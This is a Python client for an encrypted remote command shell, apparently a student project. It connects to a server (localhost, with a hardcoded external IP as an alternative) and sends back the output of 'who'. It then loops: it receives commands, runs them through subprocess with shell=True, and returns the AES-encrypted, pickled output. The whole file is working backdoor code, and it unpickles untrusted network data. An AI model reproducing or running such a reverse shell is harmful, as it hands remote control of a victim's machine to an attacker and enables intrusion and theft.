import socket
import pickle
import subprocess
import time
import pdb
from Crypto.Cipher import AES

#||||||||||||||||||||||||||||||CLIENT||||||||||||||||||||||||||

#TODO


socket = socket.socket()
HVA = '145.109.148.241'
l = 'localhost'
serverAddress = l, 1111

global key
key = []


def encryptAES(message, key):
    obj = AES.new(key[0][0], AES.MODE_CFB, key[0][1])
    ciphertext = obj.encrypt(message)
    return ciphertext


def decryptAES(ciphertext, key):
    obj2 = AES.new(key[0][0], AES.MODE_CFB, key[0][1])
    message = obj2.decrypt(ciphertext)
    return message

#   --> Execute a command and return the result of it
def popenExecution(data):
    command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    return str(command.stdout.read() + command.stderr.read(), "utf-8")


#   --> Send a payload to the server, serializes into an encryption
def send(socket, payload):
    try:
        payload = pickle.dumps(payload)
        payload = encryptAES(payload, key)
        socket.send(payload)
        #socket.send(pickle.dumps(encryptAES(payload, key))) #Serialize --> encrypt --> send
    except Exception as e:
        print(e)
        time.sleep(1)

#   --> Receives a command, deserializes into a decryption, into a execution. Sends the output of that back
def receive(socket):
    try:
        command = decryptAES(pickle.loads(socket.recv(2048)), key) #deserialize --> decrypt
        result = popenExecution(command.decode('utf-8'))
        response = {command : result}
        print(response)
        send(socket, response) # --> send 

    except Exception as e:
        print(e)

def main():

    socket.connect(serverAddress)
    #Standard command to identify who this machine is
    socket.send(pickle.dumps(popenExecution("who").split()[0])) 
    x = pickle.loads(socket.recv(2048))
    key.append(x)
    print(key)

    while True:
        receive(socket)


main()
